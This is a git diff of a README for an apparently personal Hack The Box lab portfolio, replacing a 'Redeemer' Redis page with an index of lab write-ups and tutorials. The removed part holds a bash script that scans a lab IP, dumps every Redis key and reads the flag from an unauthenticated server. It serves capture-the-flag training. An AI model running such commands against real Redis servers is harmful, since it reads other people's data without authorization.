@@ -1,41 +1,47 @@
-# HTB “Redeemer” Redis Exploit
+# Obsidian Signal Labs
 
-**Description**  
-Exploit a misconfigured Redis server on Hack The Box’s “Redeemer” box to retrieve the flag.
+A collection of hands‑on HTB labs, automation scripts, and published write‑ups by **keyfive5**.
 
-## Quick Start
+---
 
-```
-git clone https://github.com/keyfive5/obsidiansignal-htb-redeemer.git
-cd obsidiansignal-htb-redeemer
-bash scripts/enum-redis.sh 10.129.136.194
-```
+## 📚 Table of Contents
 
+1. [HTB “Dancing” – SMB Exploit](#htb-dancing--smb-exploit)  
+2. [HTB “Redeemer” – Redis Exploit](#htb-redeemer--redis-exploit)  
+3. [Published Articles](#published-articles)  
+4. [Repository Structure](#repository-structure)  
+5. [How to Reproduce](#how-to-reproduce)  
+6. [Connect with Me](#connect-with-me)
 
-## Contents
-- [Write‑Up](writeup/lab-writeup.md)
-- [Screenshots](screenshots/)
-- [Automation Script](scripts/enum-smb.sh)
+---
 
-## Results
+## HTB “Dancing” – SMB Exploit
 
-**scripts/enum-redis.sh**  
-```
-#!/usr/bin/env bash
-# Usage: ./enum-redis.sh <TARGET_IP>
+- **Write‑Up:** [writeup/lab-writeup.md](writeup/lab-writeup.md)  
+- **PDF Report:** [writeup/lab-report.pdf](writeup/lab-report.pdf)  
+- **Automation:** `scripts/enum-smb.sh`  
+- **GitHub:** https://github.com/keyfive5/obsidiansignal-htb-dancing  
+- **Dev.to Tutorial:** https://dev.to/keyfive5/exploiting-htbs-dancing-box-with-smb-misconfiguration  
 
-TARGET=$1
+---
 
-echo "[*] Nmap scan for Redis..."
-nmap -p 6379 -sV $TARGET -oN nmap-6379.txt
+## HTB “Redeemer” – Redis Exploit
 
-echo "[*] Enumerating Redis info..."
-redis-cli -h $TARGET info | tee screenshots/redis-info.txt
+- **Write‑Up:** [writeup/lab-writeup.md](writeup/lab-writeup.md)  
+- **PDF Report:** [writeup/lab-report.pdf](writeup/lab-report.pdf)  
+- **Automation:** `scripts/enum-redis.sh`  
+- **GitHub:** https://github.com/keyfive5/obsidiansignal-htb-redeemer  
+- **Dev.to Tutorial:** https://dev.to/keyfive5/exploiting-htbs-redeemer-box-with-redis-misconfiguration-20dh  
 
-echo "[*] Dumping keys..."
-redis-cli -h $TARGET --raw keys '*' | tee screenshots/keys.txt
+---
 
-echo "[*] Retrieving flag..."
-FLAG=$(redis-cli -h $TARGET get flag)
-echo "[*] Flag: $FLAG"
-```
+## Published Articles
+
+- HTB “Dancing” SMB Exploit – Dev.to  
+- HTB “Redeemer” Redis Exploit – Dev.to  
+- (Coming soon on Medium & LinkedIn)  
+
+---
+
+## Repository Structure
+
